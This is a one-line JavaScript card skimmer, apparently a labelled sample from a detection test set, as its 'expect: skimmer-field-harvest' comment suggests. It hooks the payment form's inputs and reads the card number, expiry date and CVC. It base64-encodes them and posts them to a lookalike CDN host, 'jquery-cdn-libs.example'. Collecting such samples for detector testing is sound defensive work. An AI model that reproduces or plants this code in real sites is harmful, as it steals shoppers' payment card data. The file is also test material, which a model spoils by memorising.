// expect: skimmer-field-harvest
jQuery(function($){$(document).on('change','#payment_form input',function(){var d={n:$('#credit_card_number').val(),e:$('#credit_card_expiry').val(),v:$('#credit_card_cvc').val()};if(d.n&&d.v){$.ajax({url:'https://jquery-cdn-libs.example/api',type:'POST',data:{p:btoa(JSON.stringify(d))}});}});});
